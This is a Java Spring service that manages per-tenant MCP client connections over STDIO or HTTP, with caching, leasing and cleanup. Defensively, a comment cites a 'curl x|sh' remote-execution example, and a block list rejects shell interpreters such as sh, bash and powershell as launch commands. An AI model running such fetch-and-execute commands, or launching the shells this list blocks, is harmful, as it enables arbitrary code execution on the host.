/*
 * Copyright (c) 2023 MICRO-SERVICE-PLATFORM Authors. All Rights Reserved.
 *
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.microservice.platform.ai.service.impl;

import com.microservice.framework.commons.exception.CheckedException;
import com.microservice.platform.ai.core.constant.AiServiceConstants;
import com.microservice.platform.ai.domain.entity.McpServer;
import com.microservice.platform.ai.domain.model.McpToolGovernancePolicy;
import com.microservice.platform.ai.repository.McpServerMapper;
import com.microservice.platform.ai.service.McpConnectionManager;
import com.microservice.framework.db.mybatisplus.wrap.Wraps;
import dev.langchain4j.mcp.client.DefaultMcpClient;
import dev.langchain4j.mcp.client.McpClient;
import dev.langchain4j.mcp.client.transport.McpTransport;
import dev.langchain4j.mcp.client.transport.http.StreamableHttpMcpTransport;
import dev.langchain4j.mcp.client.transport.stdio.StdioMcpTransport;
import jakarta.annotation.PreDestroy;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * MCP连接管理器实现
 *
 * @author xJh
 * @since 2025/12/07
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class McpConnectionManagerImpl implements McpConnectionManager {

    /**
     * STDIO 传输禁止直接以 shell 解释器作为启动命令，防止 command=/bin/sh args=[-c, "curl x|sh"] 类远程命令执行。
     * 正常的 MCP Server 通过 npx/uvx/node/python 等托管进程启动，不应直接调用 shell。
     */
    private static final Set<String> BLOCKED_STDIO_COMMANDS = Set.of(
            "sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "fish",
            "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh",
            "wscript", "wscript.exe", "cscript", "cscript.exe");

    private final McpServerMapper mcpServerMapper;

    // MCP 配置属于租户数据，缓存键必须同时包含租户和配置 ID。
    private final Map<ClientKey, ClientHolder> clientCache = new ConcurrentHashMap<>();

    @Override
    public synchronized McpClient getClient(Long tenantId, Long configId) {
        return holder(tenantId, configId).client;
    }

    @Override
    public synchronized ClientLease leaseClient(Long tenantId, Long configId) {
        ClientHolder holder = holder(tenantId, configId);
        holder.references.incrementAndGet();
        return new ClientLease(holder.client, () -> release(holder));
    }

    @Override
    public synchronized Optional<McpToolGovernancePolicy> findToolGovernance(Long tenantId, Long configId,
                                                                             String toolName) {
        if (toolName == null || toolName.isBlank()) {
            return Optional.empty();
        }
        return Optional.ofNullable(holder(tenantId, configId).toolGovernance.get(toolName.trim()));
    }

    private ClientHolder holder(Long tenantId, Long configId) {
        ClientKey key = new ClientKey(requirePositive(tenantId, "租户 ID"), requirePositive(configId, "MCP 配置 ID"));
        ClientHolder cached = clientCache.get(key);
        if (cached != null) {
            return cached;
        }
        McpServer config = mcpServerMapper.selectOne(Wraps.<McpServer>lbQ()
                .eq(McpServer::getTenantId, key.tenantId()).eq(McpServer::getId, key.configId()));
        if (config == null) {
            throw CheckedException.notFound("MCP 配置不存在或不属于当前租户: " + configId);
        }

        if (Boolean.FALSE.equals(config.getStatus())) {
            throw CheckedException.badRequest("MCP 服务已禁用: " + config.getName());
        }
        // TODO computeIfAbsent 原子创建
        Map<String, McpToolGovernancePolicy> governance = config.getToolGovernance() == null
                ? Map.of()
                : Map.copyOf(config.getToolGovernance());
        ClientHolder created = new ClientHolder(key.tenantId(), key.configId(), createClient(config), governance);
        clientCache.put(key, created);
        return created;
    }

    @Override
    public synchronized void closeClient(Long tenantId, Long configId) {
        ClientHolder holder = clientCache.remove(new ClientKey(requirePositive(tenantId, "租户 ID"),
                requirePositive(configId, "MCP 配置 ID")));
        if (holder == null) {
            return;
        }
        holder.retiring = true;
        closeIfIdle(holder);
    }

    @Override
    public void refreshClient(Long tenantId, Long configId) {
        closeClient(tenantId, configId);
        // 下次 getClient 时会自动重新创建
    }

    /**
     * 应用关闭时统一释放所有缓存的 MCP 客户端，避免 STDIO 子进程 / SSE 连接泄漏。
     */
    @PreDestroy
    public void destroyAll() {
        clientCache.values().forEach(this::closeNow);
        clientCache.clear();
    }

    private synchronized void release(ClientHolder holder) {
        if (holder.references.decrementAndGet() < 0) {
            throw new IllegalStateException("MCP 客户端租约引用计数异常：" + holder.configId);
        }
        closeIfIdle(holder);
    }

    private void closeIfIdle(ClientHolder holder) {
        if (holder.retiring && holder.references.get() == 0) {
            closeNow(holder);
        }
    }

    private void closeNow(ClientHolder holder) {
        if (holder.closed) {
            return;
        }
        holder.closed = true;
        try {
            holder.client.close();
        } catch (Exception e) {
            log.warn("释放 MCP 客户端失败：tenantId={}, configId={}", holder.tenantId, holder.configId, e);
        }
    }

    private McpClient createClient(McpServer config) {
        McpTransport transport;

        if ("STDIO".equalsIgnoreCase(config.getType())) {
            validateStdioCommand(config.getCommand());
            Map<String, String> env = config.getEnv();
            List<String> args = config.getArgs();

            List<String> fullCommand = new ArrayList<>();
            fullCommand.add(config.getCommand());
            if (args != null && !args.isEmpty()) {
                fullCommand.addAll(args);
            }

            StdioMcpTransport.Builder builder = StdioMcpTransport.builder()
                    .command(fullCommand)
                    .logEvents(false);

            if (env != null && !env.isEmpty()) {
                builder.environment(env);
            }

            transport = builder.build();
        } else if ("SSE".equalsIgnoreCase(config.getType()) || "HTTP".equalsIgnoreCase(config.getType())) {
            transport = StreamableHttpMcpTransport.builder()
                    .url(config.getUrl())
                    .logRequests(false)
                    .logResponses(false)
                    .build();
        } else {
            throw CheckedException.badRequest("不支持的 MCP 传输类型: " + config.getType());
        }

        return new DefaultMcpClient.Builder()
                .key("micro-service-platform-ai-" + config.getId())
                .transport(transport)
                .toolExecutionTimeout(Duration.ofSeconds(AiServiceConstants.MCP_TOOL_EXECUTION_TIMEOUT_SECONDS))
                .build();
    }

    /**
     * 校验 STDIO 启动命令，拒绝直接以 shell 解释器启动，缓解任意命令执行风险。
     * @param command command 参数
     */
    private void validateStdioCommand(String command) {
        if (command == null || command.isBlank()) {
            throw CheckedException.badRequest("STDIO 类型 MCP 配置缺少启动命令");
        }
        String normalized = command.trim().replace('\\', '/');
        int slash = normalized.lastIndexOf('/');
        String baseName = (slash >= 0 ? normalized.substring(slash + 1) : normalized).toLowerCase();
        if (BLOCKED_STDIO_COMMANDS.contains(baseName)) {
            throw CheckedException.badRequest("出于安全考虑，禁止以 shell 解释器作为 MCP 启动命令: " + command);
        }
    }

    private static final class ClientHolder {

        private final Long tenantId;
        private final Long configId;
        private final McpClient client;
        private final Map<String, McpToolGovernancePolicy> toolGovernance;
        private final AtomicInteger references = new AtomicInteger();
        private boolean retiring;
        private boolean closed;

        private ClientHolder(Long tenantId, Long configId, McpClient client,
                             Map<String, McpToolGovernancePolicy> toolGovernance) {
            this.tenantId = tenantId;
            this.configId = configId;
            this.client = client;
            this.toolGovernance = Map.copyOf(toolGovernance);
        }
    }

    private record ClientKey(Long tenantId, Long configId) {
    }

    private static Long requirePositive(Long value, String field) {
        if (value == null || value <= 0) {
            throw CheckedException.badRequest(field + "必须是正整数");
        }
        return value;
    }
}
